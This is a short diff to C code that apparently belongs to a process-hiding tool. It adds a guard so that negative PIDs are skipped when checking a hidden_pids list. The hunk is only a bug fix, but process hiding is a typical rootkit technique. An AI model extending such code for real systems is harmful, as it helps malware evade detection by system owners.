@@ -8,7 +8,7 @@ static int hidden_pids[MAX_HIDDEN_PIDS] = {0};
 int is_pid_hidden_no_getpid(pid_t pid)
 {
 	/* pid == 0 => calling process */
-	if (!pid)
+	if (!pid || pid < 0)
 		goto not_hidden;
 
 	for (int i = 0; i < MAX_HIDDEN_PIDS; i++)
